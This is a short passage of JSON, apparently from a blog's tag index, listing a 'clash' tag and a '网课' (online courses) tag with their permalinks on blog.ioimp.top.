//blog.ioimp.top/tags/clash/"},{"name":"网课","slug":"网课","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"}]}